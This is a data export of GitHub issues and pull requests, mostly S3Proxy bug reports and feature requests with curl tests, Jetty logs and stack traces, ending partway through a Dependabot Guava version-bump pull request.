ETag: ""098f6bcd4621d373cade4e832627b4f6""
Content-Length: 0
Server: Jetty(9.2.z-SNAPSHOT)

% curl -XGET 192.168.42.43:8080/foo/bar
test%
```

```
  % curl -i -XDELETE 192.168.42.43:8080/foo/bar
HTTP/1.1 204 No Content
Date: Tue, 14 Oct 2014 23:59:37 GMT
Server: Jetty(9.2.z-SNAPSHOT)
```

Instead currently it seems to 204. I'll take a peek at the code.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/19/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/19/comments,https://api.github.com/repos/gaul/s3proxy/issues/19/events,https://github.com/gaul/s3proxy/issues/19,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/18,45819586,MDU6SXNzdWU0NTgxOTU4Ng==,18,Blob metadata ignored with filesystem provider,794478,closed,FALSE,NA,NA,6,2014-10-15T01:14:55Z,2017-11-08T22:52:21Z,2014-11-18T15:13:14Z,NONE,NA,"```
% curl -i -XPUT -H'Content-Type: application/json' 192.168.42.43:8080/foo/bar -d '{""foo"": ""bar""}'
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2014 23:49:33 GMT
ETag: ""94232c5b8fc9272f6f73a1e36eb68fcf""
Content-Length: 0
Server: Jetty(9.2.z-SNAPSHOT)


% curl -i -XGET 192.168.42.43:8080/foo/bar
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2014 23:49:35 GMT
Content-Type: application/unknown
Content-MD5: lCMsW4/JJy9vc6HjbraPzw==
ETag: ""94232c5b8fc9272f6f73a1e36eb68fcf""
Last-Modified: Tue, 14 Oct 2014 23:49:33 GMT
Content-Length: 14
Server: Jetty(9.2.z-SNAPSHOT)

{""foo"": ""bar""}%
```

Expected content-type to not be defaulted to `application/unknown`. This was on 67927983476baf4388acf3f9b458b575182035da. I'll take a peek at the code.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/18/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/18/comments,https://api.github.com/repos/gaul/s3proxy/issues/18/events,https://github.com/gaul/s3proxy/issues/18,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/17,45812712,MDU6SXNzdWU0NTgxMjcxMg==,17,403s all of a sudden?,794478,closed,FALSE,NA,NA,4,2014-10-14T23:24:01Z,2014-10-15T00:31:08Z,2014-10-15T00:25:42Z,NONE,NA,"I redeployed my docker container and now I'm getting 403 on things that I think used to work:

```
± % cat config/s3proxy.conf                                                                                                                                                                                                                                            !11500
s3proxy.authorization=none
s3proxy.endpoint=http://0.0.0.0:8080
jclouds.provider=filesystem
jclouds.identity=identity
jclouds.credential=credential
jclouds.filesystem.basedir=/data
```

```
docker run -t -i -p 8080:8080 s3proxy
I 10-14 23:22:56.659 main org.eclipse.jetty.util.log:188 |::] Logging initialized @1617ms
I 10-14 23:22:56.695 main o.eclipse.jetty.server.Server:327 |::] jetty-9.2.z-SNAPSHOT
I 10-14 23:22:56.719 main o.e.j.server.ServerConnector:266 |::] Started ServerConnector@78c1f32c{HTTP/1.1}{0.0.0.0:8080}
I 10-14 23:22:56.720 main o.eclipse.jetty.server.Server:379 |::] Started @1681ms
```

```
  % curl -i -XPUT 192.168.42.43:8080/foo                                 !10164
HTTP/1.1 403 Forbidden
Date: Tue, 14 Oct 2014 23:23:06 GMT
Transfer-Encoding: chunked
Server: Jetty(9.2.z-SNAPSHOT)

<?xml version=""1.0"" encoding=""UTF-8""?><Error>
  <Code>AccessDenied</Code>
  <Message>Forbidden</Message>
  <RequestId>4442587FB7D0A2F9</RequestId>
</Error>%
```

Any idea?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/17/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/17/comments,https://api.github.com/repos/gaul/s3proxy/issues/17/events,https://github.com/gaul/s3proxy/issues/17,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/16,45484474,MDExOlB1bGxSZXF1ZXN0MjI1NjI3OTU=,16,Allow System properties to override configuration,848247,closed,FALSE,NA,NA,1,2014-10-10T14:11:24Z,2014-10-10T17:22:12Z,2014-10-10T17:21:39Z,OWNER,NA,"Fixes #15.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/16/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/16/comments,https://api.github.com/repos/gaul/s3proxy/issues/16/events,https://github.com/gaul/s3proxy/pull/16,https://api.github.com/repos/gaul/s3proxy/pulls/16
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/15,45467104,MDU6SXNzdWU0NTQ2NzEwNA==,15,commandline port configuration,1204681,closed,FALSE,NA,NA,3,2014-10-10T10:27:53Z,2014-10-10T17:23:49Z,2014-10-10T17:21:39Z,NONE,NA,"Allow setting port (or all configuration) via commandline.
Example use case: setting the port for running on heroku.
For example this could be done via environment variables or system properties.

```
S3PROXY_PORT=8080 java -jar s3proxy --properties s3proxy.conf
```

```
java -Ds3proxy.port=8080 -jar s3proxy --properties s3proxy.conf
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/15/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/15/comments,https://api.github.com/repos/gaul/s3proxy/issues/15/events,https://github.com/gaul/s3proxy/issues/15,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/14,40746244,MDU6SXNzdWU0MDc0NjI0NA==,14,hang on HEAD request?,794478,closed,FALSE,NA,NA,2,2014-08-20T21:20:33Z,2014-08-20T21:43:48Z,2014-08-20T21:42:10Z,NONE,NA,"```
user@local ~
% curl -i -XPUT 192.168.42.43:8080/foo
HTTP/1.1 200 OK
Date: Wed, 20 Aug 2014 04:53:31 GMT
Content-Length: 0
Server: Jetty(9.2.z-SNAPSHOT)
```

```
user@local ~
% curl -i -XPUT 192.168.42.43:8080/foo/blah -d 'my data'
HTTP/1.1 200 OK
Date: Wed, 20 Aug 2014 04:53:39 GMT
ETag: ""1291e1c0aa879147f51f4a279e7c2e55""
Content-Length: 0
Server: Jetty(9.2.z-SNAPSHOT)
```

```
user@local ~
% curl -i -XGET 192.168.42.43:8080/foo/blah
HTTP/1.1 200 OK
Date: Wed, 20 Aug 2014 04:53:46 GMT
Content-Type: application/unknown
Content-MD5: EpHhwKqHkUf1H0onnnwuVQ==
Last-Modified: Wed, 20 Aug 2014 04:53:39 GMT
Content-Length: 7
Server: Jetty(9.2.z-SNAPSHOT)

my data
```

```
user@local ~
% curl -i -XHEAD 192.168.42.43:8080/foo/blah
HTTP/1.1 200 OK
Date: Wed, 20 Aug 2014 04:53:50 GMT
Content-Type: application/unknown
Content-MD5: EpHhwKqHkUf1H0onnnwuVQ==
Last-Modified: Wed, 20 Aug 2014 04:53:39 GMT
Content-Length: 7
Server: Jetty(9.2.z-SNAPSHOT)

^C
```

I had to Ctrl-c out of it. Is this expected behavior?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/14/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/14/comments,https://api.github.com/repos/gaul/s3proxy/issues/14/events,https://github.com/gaul/s3proxy/issues/14,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/13,40538837,MDU6SXNzdWU0MDUzODgzNw==,13,S3Proxy includes bogus Expires headers,848247,closed,FALSE,NA,NA,0,2014-08-18T22:18:45Z,2014-08-18T22:24:08Z,2014-08-18T22:24:08Z,OWNER,NA,"S3Proxy incorrectly compares the return value of `HttpServletRequest.getDateHeader` against 0 instead of -1:

http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getDateHeader(java.lang.String)
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/13/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/13/comments,https://api.github.com/repos/gaul/s3proxy/issues/13/events,https://github.com/gaul/s3proxy/issues/13,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/12,40459066,MDU6SXNzdWU0MDQ1OTA2Ng==,12,allow proxy-server multi-part upload ,848247,closed,FALSE,NA,NA,0,2014-08-18T06:25:09Z,2014-08-18T06:44:20Z,2014-08-18T06:44:20Z,OWNER,NA,"Some object stores limit single-part object size to a much smaller size than S3, e.g., Azure's 64 MB limit.  S3Proxy should use multi-part uploads in this situation and provide a configuration knob to enable it.  Note that this issue discusses proxy-server transfers, whereas #2 discusses client-proxy transfers.  Azure specifically needs a fix for [JCLOUDS-671](https://issues.apache.org/jira/browse/JCLOUDS-671) to use MPU with the `InputStream` payloads that S3Proxy uses.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/12/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/12/comments,https://api.github.com/repos/gaul/s3proxy/issues/12/events,https://github.com/gaul/s3proxy/issues/12,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/11,40218469,MDU6SXNzdWU0MDIxODQ2OQ==,11,Support multiple providers/configurations,703870,closed,FALSE,NA,NA,2,2014-08-14T02:39:44Z,2017-11-07T23:39:48Z,2017-11-07T23:39:48Z,CONTRIBUTOR,NA,"It would be great to be able to support multiple providers/configurations through a single S3Proxy process. For example, by specifying AWS S3 and GCS, one could transfer data from one provider to another (there are a bunch of other use cases).

One way to do this would be to use the location (but that feels like an incorrect patch, as the location itself may be useful to express).

Another way would be through an extended endpoint path, e.g. http://127.0.0.1/aws and http://127.0.0.1/gcs.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/11/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/11/comments,https://api.github.com/repos/gaul/s3proxy/issues/11/events,https://github.com/gaul/s3proxy/issues/11,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/10,40038850,MDU6SXNzdWU0MDAzODg1MA==,10,error on copy,1204681,closed,FALSE,NA,NA,8,2014-08-12T09:36:25Z,2014-08-14T08:30:55Z,2014-08-13T22:25:23Z,NONE,NA,"copying within the same bucket results in error on transient store

```
W 08-12 11:23:41.959 qtp1011325276-17 o.e.jetty.server.HttpChannel:372 |::] /bucket1/test/data/kw56pd6b5kr3ti6oo7vd44hbfu
org.jclouds.blobstore.ContainerNotFoundException:  not found: container  not in [bucket1]
    at org.jclouds.blobstore.LocalAsyncBlobStore.cnfe(LocalAsyncBlobStore.java:222) ~[s3proxy:1.0.0]
    at org.jclouds.blobstore.LocalAsyncBlobStore.getBlob(LocalAsyncBlobStore.java:432) ~[s3proxy:1.0.0]
    at org.jclouds.blobstore.internal.BaseAsyncBlobStore.getBlob(BaseAsyncBlobStore.java:244) ~[s3proxy:1.0.0]
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.7.0_51]
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) ~[na:1.7.0_51]
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.7.0_51]
    at java.lang.reflect.Method.invoke(Method.java:606) ~[na:1.7.0_51]
    at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37) ~[s3proxy:1.0.0]
    at com.sun.proxy.$Proxy40.getBlob(Unknown Source) ~[na:na]
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.7.0_51]
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) ~[na:1.7.0_51]
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.7.0_51]
    at java.lang.reflect.Method.invoke(Method.java:606) ~[na:1.7.0_51]
    at com.google.common.reflect.Invokable$MethodInvokable.invokeInternal(Invokable.java:197) ~[s3proxy:1.0.0]
    at com.google.common.reflect.Invokable.invoke(Invokable.java:102) ~[s3proxy:1.0.0]
    at org.jclouds.rest.internal.InvokeAndCallGetOnFutures.apply(InvokeAndCallGetOnFutures.java:67) ~[s3proxy:1.0.0]
    at org.jclouds.rest.internal.InvokeAndCallGetOnFutures.apply(InvokeAndCallGetOnFutures.java:39) ~[s3proxy:1.0.0]
    at org.jclouds.rest.internal.DelegatesToInvocationFunction.handle(DelegatesToInvocationFunction.java:156) ~[s3proxy:1.0.0]
    at org.jclouds.rest.internal.DelegatesToInvocationFunction.invoke(DelegatesToInvocationFunction.java:123) ~[s3proxy:1.0.0]
    at com.sun.proxy.$Proxy41.getBlob(Unknown Source) ~[na:na]
    at org.gaul.s3proxy.S3ProxyHandler.handleCopyBlob(S3ProxyHandler.java:565) ~[s3proxy:1.0.0]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:177) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.Server.handle(Server.java:485) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:290) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:248) [s3proxy:1.0.0]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [s3proxy:1.0.0]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:606) [s3proxy:1.0.0]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:535) [s3proxy:1.0.0]
    at java.lang.Thread.run(Thread.java:744) [na:1.7.0_51]
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/10/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/10/comments,https://api.github.com/repos/gaul/s3proxy/issues/10/events,https://github.com/gaul/s3proxy/issues/10,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/9,40037414,MDU6SXNzdWU0MDAzNzQxNA==,9,NumberFormatException on open range,1204681,closed,FALSE,NA,NA,1,2014-08-12T09:16:09Z,2014-08-12T19:28:47Z,2014-08-12T19:28:31Z,NONE,NA,"A half open range, like -500 or 9500- results in a NumberFormatException.
Both parts of the range are always parsed as long.

stacktrace:

```
java.lang.NumberFormatException: For input string: """"
    at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) ~[na:1.7.0_51]
    at java.lang.Long.parseLong(Long.java:453) ~[na:1.7.0_51]
    at java.lang.Long.parseLong(Long.java:483) ~[na:1.7.0_51]
    at org.gaul.s3proxy.S3ProxyHandler.handleGetBlob(S3ProxyHandler.java:499) ~[s3proxy:1.0.0]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:152) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.Server.handle(Server.java:485) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:290) ~[s3proxy:1.0.0]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:248) [s3proxy:1.0.0]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [s3proxy:1.0.0]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:606) [s3proxy:1.0.0]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:535) [s3proxy:1.0.0]
    at java.lang.Thread.run(Thread.java:744) [na:1.7.0_51]
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/9/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/9/comments,https://api.github.com/repos/gaul/s3proxy/issues/9/events,https://github.com/gaul/s3proxy/issues/9,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/8,38866055,MDU6SXNzdWUzODg2NjA1NQ==,8,support bucket-in-hostname,848247,closed,FALSE,NA,NA,2,2014-07-28T07:06:28Z,2015-01-13T19:40:14Z,2014-08-27T02:51:27Z,OWNER,NA,"S3Proxy supports bucket-in-path URLs, e.g., example.com/bucket-name/blob-name.  It should also support bucket-in-hostname URLs, e.g., bucket-name.example.com/blob-name.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/8/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/8/comments,https://api.github.com/repos/gaul/s3proxy/issues/8/events,https://github.com/gaul/s3proxy/issues/8,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/7,38860287,MDU6SXNzdWUzODg2MDI4Nw==,7,publish release,848247,closed,FALSE,NA,NA,0,2014-07-28T04:06:01Z,2014-08-12T06:43:43Z,2014-08-12T06:43:43Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/7/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/7/comments,https://api.github.com/repos/gaul/s3proxy/issues/7/events,https://github.com/gaul/s3proxy/issues/7,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/6,38850821,MDU6SXNzdWUzODg1MDgyMQ==,6,filesystem provider metadata support,848247,closed,FALSE,NA,NA,1,2014-07-27T21:15:44Z,2015-01-22T22:03:59Z,2015-01-22T22:03:59Z,OWNER,NA,"jclouds filesystem provider does not support metadata due to its dependency on Java 6.  When jclouds merges jclouds/jclouds#443 S3Proxy can support all metadata operations, including user metadata.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/6/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/6/comments,https://api.github.com/repos/gaul/s3proxy/issues/6/events,https://github.com/gaul/s3proxy/issues/6,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/5,38850761,MDU6SXNzdWUzODg1MDc2MQ==,5,S3 compatibility test,848247,closed,FALSE,NA,NA,2,2014-07-27T21:13:24Z,2015-02-14T03:23:29Z,2015-02-14T03:23:29Z,OWNER,NA,"S3Proxy should use an existing S3 compatibility tool such as https://github.com/ceph/s3-tests instead of a hodge-podge of unit tests, jclouds integration tests, and s3fs-fuse operations.  Results from the latest jclouds integration test run:

```
Failed tests:
  S3ContainerLiveTest>BaseContainerLiveTest.testPublicAccess:75 [type=BLOB, id=null, name=hello, location={scope=PROVIDER, id=s3, description=http://127.0.0.1:8080}, uri=http://127.0.0.1:8080/gaul-blobstore-1183189886598536954/hello, userMetadata={}] expected object to not be null
  BucketsLiveTest.testBucketLogging:209->setupAclForBucketLoggingTarget:258 » IllegalState
  BucketsLiveTest.testBucketPayer:176 expected [UNRECOGNIZED] but found [BUCKET_OWNER]
  BucketsLiveTest.testPublicReadAccessPolicy:151 AccessControlList{owner=org.jclouds.s3.domain.CanonicalUser@52bd459b, grants=[Grant{grantee=CanonicalUserGrantee{displayName='CustomersName@amazon.com', identifier='75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a'}, permission=FULL_CONTROL}]} expected [true] but found [false]
  BucketsLiveTest.testUpdateBucketACL:116 » IllegalState Your previous request t...
  S3ClientLiveTest.testCopyCannedAccessPolicyPublic:118 » Runtime request: PUT h...
  S3ClientLiveTest.testCopyIfMatch:418 » Runtime request: PUT http://127.0.0.1:8...
  S3ClientLiveTest.testCopyIfModifiedSince:369 » Runtime request: PUT http://127...
  S3ClientLiveTest.testCopyIfNoneMatch:440 » Runtime request: PUT http://127.0.0...
  S3ClientLiveTest.testCopyIfUnmodifiedSince:396 » Runtime request: PUT http://1...
  S3ClientLiveTest.testCopyObject:343 » Runtime request: PUT http://127.0.0.1:80...
  S3ClientLiveTest.testCopyWithMetadata:465 » Runtime request: PUT http://127.0....
  S3ClientLiveTest.testMetadataWithCacheControlAndContentDisposition:298->assertCacheControl:307 NullPointer
  S3ClientLiveTest.testPrivateAclIsDefaultForObject:226 expected [1] but found [0]
  S3ClientLiveTest.testPublicReadOnObject:245->BaseBlobStoreIntegrationTest.assertConsistencyAware:248->BaseBlobStoreIntegrationTest.assertConsistencyAware:235 » Runtime
  S3ClientLiveTest.testPublicWriteOnObject:147->BaseBlobStoreIntegrationTest.assertConsistencyAware:248->BaseBlobStoreIntegrationTest.assertConsistencyAware:235 » Runtime
  S3ClientLiveTest.testPutCannedAccessPolicyPublic:104 » UnknownHost gaul-blobst...
  S3ClientLiveTest.testUpdateObjectACL:180 NullPointer

Tests run: 86, Failures: 18, Errors: 0, Skipped: 5
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/5/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/5/comments,https://api.github.com/repos/gaul/s3proxy/issues/5/events,https://github.com/gaul/s3proxy/issues/5,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/4,38850644,MDU6SXNzdWUzODg1MDY0NA==,4,support authorization,848247,closed,FALSE,NA,NA,0,2014-07-27T21:07:47Z,2014-07-30T07:18:45Z,2014-07-30T07:18:45Z,OWNER,NA,"S3Proxy ignores the Authorization header in S3 requests.  It should validate this against configurable local credentials.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/4/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/4/comments,https://api.github.com/repos/gaul/s3proxy/issues/4/events,https://github.com/gaul/s3proxy/issues/4,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/3,38850623,MDU6SXNzdWUzODg1MDYyMw==,3,listen on HTTPS,848247,closed,FALSE,NA,NA,3,2014-07-27T21:06:42Z,2014-08-14T20:20:29Z,2014-08-14T08:21:43Z,OWNER,NA,"S3Proxy only supports listening on the HTTP protocol.  It should also support HTTPS to allow use on untrusted networks.  How to configure Jetty to allow this while minimizing user complexity of certificate management?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/3/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/3/comments,https://api.github.com/repos/gaul/s3proxy/issues/3/events,https://github.com/gaul/s3proxy/issues/3,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/2,38850565,MDU6SXNzdWUzODg1MDU2NQ==,2,native multi-part upload,848247,closed,FALSE,NA,NA,0,2014-07-27T21:04:13Z,2015-05-01T21:00:09Z,2015-05-01T21:00:09Z,OWNER,NA,"AWS-S3 limits single-part uploads to 5 GB and provides multi-part uploads to allow larger blobs.  This API consists of initiate, uploadPart, complete, abort, and listParts.  How to translate these multiple calls into the single jclouds method `BlobStore.putBlob(blob, multipart())`?  Can S3Proxy provide a dynamic `Payload` variant which demuxes these calls?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/2/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/2/comments,https://api.github.com/repos/gaul/s3proxy/issues/2/events,https://github.com/gaul/s3proxy/issues/2,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/1,38850469,MDU6SXNzdWUzODg1MDQ2OQ==,1,larger than 2 GB single-part uploads,848247,closed,FALSE,NA,NA,3,2014-07-27T20:59:39Z,2016-05-17T18:46:40Z,2015-01-22T22:03:59Z,OWNER,NA,"jclouds dependency on Java 6 limits S3Proxy to 2 GB single-part uploads.  When jclouds merges jclouds/jclouds#426 S3Proxy can support larger uploads, although many providers have a 5 GB single-part limit.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/1/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/1/comments,https://api.github.com/repos/gaul/s3proxy/issues/1/events,https://github.com/gaul/s3proxy/issues/1,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/123,868021403,MDExOlB1bGxSZXF1ZXN0NjIzNTk5NjUz,123,Bump commons-io from 2.4 to 2.7 in /modernizer-maven-plugin,49699333,open,FALSE,NA,NA,0,2021-04-26T18:50:04Z,2021-04-26T18:50:05Z,NA,CONTRIBUTOR,NA,"Bumps commons-io from 2.4 to 2.7.


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=commons-io:commons-io&package-manager=maven&previous-version=2.4&new-version=2.7)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/gaul/modernizer-maven-plugin/network/alerts).

</details>",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/123/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/123/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/123/events,https://github.com/gaul/modernizer-maven-plugin/pull/123,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/123
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/122,847328423,MDExOlB1bGxSZXF1ZXN0NjA2MzUwMDE5,122,Bump guava from 27.0.1-jre to 29.0-jre in /modernizer-maven-plugin,49699333,closed,FALSE,NA,NA,0,2021-03-31T21:00:08Z,2021-04-12T08:45:11Z,2021-04-12T08:45:08Z,CONTRIBUTOR,NA,"Bumps [guava](https://github.com/google/guava) from 27.0.1-jre to 29.0-jre.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/google/guava/releases"">guava's releases</a>.</em></p>
<blockquote>
<h2>29.0</h2>
<h3>Maven</h3>
<pre lang=""xml""><code>&lt;dependency&gt;
  &lt;groupId&gt;com.google.guava&lt;/groupId&gt;
  &lt;artifactId&gt;guava&lt;/artifactId&gt;
  &lt;version&gt;29.0-jre&lt;/version&gt;
  &lt;!-- or, for Android: --&gt;
  &lt;version&gt;29.0-android&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h3>Javadoc</h3>
<ul>
<li><a href=""http://guava.dev/releases/29.0-jre/api/docs/"">29.0-jre</a></li>
<li><a href=""http://guava.dev/releases/29.0-android/api/docs/"">29.0-android</a></li>
</ul>
<h3>JDiff</h3>
<ul>
<li><a href=""http://guava.dev/releases/29.0-jre/api/diffs/"">29.0-jre vs. 28.2-jre</a></li>
<li><a href=""http://guava.dev/releases/29.0-android/api/diffs/"">29.0-android vs. 28.2-android</a></li>
<li><a href=""http://guava.dev/releases/29.0-android/api/androiddiffs/"">29.0-android vs. 29.0-jre</a></li>
</ul>
<h3>Changelog</h3>
<ul>
<li><a href=""https://groups.google.com/d/msg/guava-announce/zHZTFg7YF3o/rQNnwdHeEwAJ"">Guava types can no longer be sent over GWT-RPC.</a> To <em>temporarily</em> reenable support, set the <code>guava.gwt.emergency_reenable_rpc</code> system property to <code>true</code>. (5214a10b1e)
<ul>
<li>This is the only breaking change in this release, and it affects only users of the <code>guava-gwt</code> artifact, not people who use only the <code>guava</code> artifact. This release contains no changes that break <em>binary compatibility</em> for any users.</li>
</ul>
</li>
<li>API documentation for Guava classes is now easier to reach. For example, for <code>ImmutableList</code>, visit <a href=""https://guava.dev/ImmutableList"">guava.dev/ImmutableList</a>. Also, more easily access the index at <a href=""https://guava.dev/api"">guava.dev/api</a>.</li>
<li><code>collect</code>: Annotated <code>FluentIterable.from(FluentIterable)</code> with <code>@DoNotCall</code>. (b1c77b7df3)</li>
<li><code>collect</code>: Made <code>ceiling</code>, <code>floor</code>, <code>headSet(E, boolean)</code>, and <code>tailSet(E, boolean)</code> methods available in the GWT-emulated <code>ImmutableSortedSet</code>. (7e0fe90ca8, 5f2fbf27b2)</li>
<li><code>graph</code>: Made it possible to set a stable incident edge order by calling the newly added method <code>[Value]Graph.Builder.incidentEdgeOrder(ElementOrder.stable())</code>. (70164025a8)</li>
